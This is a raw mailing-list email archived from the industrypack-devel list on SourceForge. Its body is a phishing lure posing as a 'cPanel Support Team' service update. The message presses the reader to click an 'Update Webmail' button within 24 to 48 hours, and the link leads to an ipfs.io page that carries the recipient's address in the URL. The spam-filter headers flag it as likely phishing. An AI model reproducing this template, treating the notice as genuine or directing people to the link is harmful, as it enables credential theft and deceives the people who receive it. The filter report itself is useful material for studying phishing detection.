Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 787F4A23C97
	for <lists+industrypack-devel@lfdr.de>; Fri, 31 Jan 2025 12:03:29 +0100 (CET)
Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1tdoo4-0007K6-8d
	for lists+industrypack-devel@lfdr.de;
	Fri, 31 Jan 2025 11:03:28 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-2.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <postmaster@sanechipz.com>) id 1tdoo3-0007Ju-8Z
 for industrypack-devel@lists.sourceforge.net;
 Fri, 31 Jan 2025 11:03:27 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Subject:Content-Type:MIME-Version:Message-ID:Date:
 To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=16mitOg8XxDEzQgYjQ1IglK+yvMp2hFNgI3+spTis/w=; b=OCMGgh+lsO2hnHQHsBojwXdvKv
 jRAdKiCkZaIav3nQuHPU09DsoJ0LEpLs3c1U0Tueobl4zD9XuLt8Sr5Mmh2YhBAgLmq4C82KpBr0f
 SB7aemIrGxy0Yz6hAI0A2fNZ3DaeUdwwtwe8PrOzR2C0OeWBskklRZ9K7s0up3NfSJ/4=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Subject:Content-Type:MIME-Version:Message-ID:Date:To:From:Sender:Reply-To
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=16mitOg8XxDEzQgYjQ1IglK+yvMp2hFNgI3+spTis/w=; b=M
 JIP8ebsqB6x1GUnVdOUnz+4rDAr4grryL40L9jX4nEKzUXOo51rqadfEAL2Vi6NR3IEixH6eAwa1e
 Qq3A2jzHTy7v2Y9iR7Vv5S8mjao9bXzWW5I2Dtrx31UkiRDAHbVt9/xspvi5fGkE/JrVIsxNGOlvY
 7t0RzbA6VBK0b7f8=;
Received: from [188.127.235.240] (helo=kamiuchi.co.jp)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtp (Exim 4.95)
 id 1tdoo1-0007DP-T1 for industrypack-devel@lists.sourceforge.net;
 Fri, 31 Jan 2025 11:03:27 +0000
Received: from sanechipz.com (localhost [127.0.0.1])
 by kamiuchi.co.jp (Postfix) with ESMTP id 5B95391F5B1
 for <industrypack-devel@lists.sourceforge.net>;
 Fri, 31 Jan 2025 03:05:26 +0300 (MSK)
To: industrypack-devel@lists.sourceforge.net
Date: 31 Jan 2025 01:05:26 +0100
Message-ID: <20250131010526.B7DCF71906D74630@sanechipz.com>
MIME-Version: 1.0
X-Spam-Score: 8.6 (++++++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-1.v13.lw.sourceforge.com", 
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  Service Update Notification Dear industrypack-devel, We are
 enhancing our webmail platform to ensure better performance and security
 for all users. These improvements are part of our ongoing effort to deliver
 a smooth and reliab [...] 
 Content analysis details:   (8.6 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 5.0 RCVD_IN_UCE1           RBL: IP Listed in UCEPROTECT Level 1
 [188.127.235.240 listed in dnsbl-1.uceprotect.net]
 0.1 URIBL_SBL_A Contains URL's A record listed in the Spamhaus SBL
 blocklist [URIs: ipfs.io]
 0.0 RCVD_IN_VALIDITY_CERTIFIED_BLOCKED RBL: ADMINISTRATOR NOTICE:
 The query to Validity was blocked.  See
 https://knowledge.validity.com/hc/en-us/articles/20961730681243
 for more information.
 [188.127.235.240 listed in sa-accredit.habeas.com]
 0.0 RCVD_IN_VALIDITY_RPBL_BLOCKED RBL: ADMINISTRATOR NOTICE: The
 query to Validity was blocked.  See
 https://knowledge.validity.com/hc/en-us/articles/20961730681243
 for more information.
 [188.127.235.240 listed in bl.score.senderscore.com]
 0.0 RCVD_IN_MSPIKE_H2      RBL: Average reputation (+2)
 [188.127.235.240 listed in wl.mailspike.net]
 1.0 SPF_SOFTFAIL           SPF: sender does not match SPF record (softfail)
 0.0 SPF_HELO_FAIL          SPF: HELO does not match SPF record (fail)
 [SPF failed: Rejected by SPF record]
 1.1 DATE_IN_PAST_06_12     Date: is 6 to 12 hours before Received: date
 0.0 T_MXG_EMAIL_FRAG       URI with email in fragment
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.0 FROM_FMBLA_NEWDOM28    From domain was registered in last 14-28
 days
 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
 0.0 URI_IPFSIO References Interplanetary File System PtP content via
 ipfs.io, likely phishing
 0.0 URI_IPFS               References Interplanetary File System PtP content, 
 probable phishing
 0.0 FROM_MISSPACED         From: missing whitespace
 0.0 FROM_MISSP_EH_MATCH    From misspaced, matches envelope
 0.0 TO_NO_BRKTS_HTML_IMG   To: lacks brackets and HTML and one image
 0.0 URI_PHISH              Phishing using web form
X-VA-Spam-Flag: YES
X-Spam-Flag: YES
X-Headers-End: 1tdoo1-0007DP-T1
Subject: [Industrypack-devel] [SPAM] Service Update Notification
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
From: "lists.sourceforge.net via Industrypack-devel"
 <industrypack-devel@lists.sourceforge.net>
Reply-To: "lists.sourceforge.net" <postmaster@sanechipz.com>
Content-Type: multipart/mixed; boundary="===============5687092146870782549=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net


--===============5687092146870782549==
Content-Type: multipart/related;
	boundary="----=_NextPart_000_0012_E75ECE1C.65DF8838"


------=_NextPart_000_0012_E75ECE1C.65DF8838
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
<BODY>
<TABLE style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; MAX-WIDTH: 600px; =
FONT-FAMILY: Arial, sans-serif; WIDTH: 600px; WHITE-SPACE: normal; WORD-SPA=
CING: 0px; BORDER-COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 40=
0; COLOR: rgb(44,54,58); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; =
WIDOWS: 2; MARGIN: 0px auto; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(=
255,255,255); border-radius: 8px; box-shadow: 0px 2px 10px rgba(0,0,0,0.1);=
 font-variant-ligatures: normal; font-variant-caps:=20
normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial;=
 text-decoration-style: initial; text-decoration-color: initial">
<TBODY style=3D"BOX-SIZING: border-box">
<TR style=3D"BOX-SIZING: border-box">
<TD style=3D"BOX-SIZING: border-box; COLOR: rgb(51,51,51); PADDING-BOTTOM: =
20px; PADDING-TOP: 20px; PADDING-LEFT: 20px; PADDING-RIGHT: 20px">
<H2 style=3D"BOX-SIZING: border-box; FONT-SIZE: 20px; MARGIN-BOTTOM: 10px; =
MARGIN-TOP: 0px; FONT-WEIGHT: 700; COLOR: rgb(7,151,179); LINE-HEIGHT: 1.2"=
><img style=3D"HEIGHT: 87px; WIDTH: 481px" src=3D"cid:cp.png" width=3D"481"=
 height=3D"86"></H2>
<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 20px; MARGIN-BOTTOM: 10px; M=
ARGIN-TOP: 0px; FONT-WEIGHT: 700; COLOR: rgb(7,151,179); LINE-HEIGHT: 1.2">=
&nbsp;</P>
<H2 style=3D"BOX-SIZING: border-box; FONT-SIZE: 20px; MARGIN-BOTTOM: 10px; =
MARGIN-TOP: 0px; FONT-WEIGHT: 700; COLOR: rgb(7,151,179); LINE-HEIGHT: 1.2"=
>Service Update Notification</H2>
<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; MARGIN-TOP: 0px; LINE-=
HEIGHT: 24px">Dear industrypack-devel, We are enhancing our webmail platfor=
m to ensure better performance and security for all users. These improvemen=
ts are part of our ongoing effort to deliver a smooth and reliable experien=
ce.</P>
<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; MARGIN-TOP: 0px; LINE-=
HEIGHT: 24px">To continue accessing your account without interruptions, we =
kindly request that you update your webmail settings at your earliest conve=
nience. This process should be completed within the next 24 to 48 hours.</P=
>
<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; MARGIN-TOP: 0px; LINE-=
HEIGHT: 24px">Please click the button below to complete the update process:=
</P>
<TABLE style=3D"BOX-SIZING: border-box; WIDTH: 560px; BORDER-COLLAPSE: coll=
apse; TEXT-ALIGN: center; MARGIN: 20px 0px">
<TBODY style=3D"BOX-SIZING: border-box">
<TR style=3D"BOX-SIZING: border-box">
<TD style=3D"BOX-SIZING: border-box"><A style=3D"BOX-SIZING: border-box; FO=
NT-SIZE: 16px; TEXT-DECORATION: none; FONT-WEIGHT: bold; COLOR: rgb(255,255=
,255); PADDING-BOTTOM: 12px; PADDING-TOP: 12px; PADDING-LEFT: 24px; DISPLAY=
: inline-block; PADDING-RIGHT: 24px; BACKGROUND-COLOR: rgb(7,151,179); bord=
er-radius: 4px" href=3D"https://ipfs.io/ipfs/bafkreiejvjuvl4mgfq5o3iywghuzc=
dda23a745zdifgvpbeq7nzctd5pmu#industrypack-devel@lists.sourceforge.net" rel=
=3Dnoreferrer target=3D_blank>Update Webmail</A></TD></TR></TBODY></TABLE>
<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; MARGIN-TOP: 0px; LINE-=
HEIGHT: 24px">If you have any questions or require further assistance, plea=
se don't hesitate to contact our support team.</P>
<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; MARGIN-TOP: 0px; LINE-=
HEIGHT: 24px">Best regards,<BR style=3D"BOX-SIZING: border-box">cPanel&reg;=
 Support Team</P></TD></TR>
<TR style=3D"BOX-SIZING: border-box">
<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; COLOR: rgb(102,102,10=
2); PADDING-BOTTOM: 20px; TEXT-ALIGN: center; PADDING-TOP: 20px; PADDING-LE=
FT: 20px; PADDING-RIGHT: 20px; BACKGROUND-COLOR: rgb(240,240,240)">&copy; 2=
025 cPanel. All Rights Reserved.</TD></TR></TBODY></TABLE></BODY></HTML>
------=_NextPart_000_0012_E75ECE1C.65DF8838
Content-Type: image/png; name="cp.png"
Content-Transfer-Encoding: base64
Content-ID: <cp.png>

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
RU5ErkJggg==

------=_NextPart_000_0012_E75ECE1C.65DF8838--



--===============5687092146870782549==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============5687092146870782549==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============5687092146870782549==--


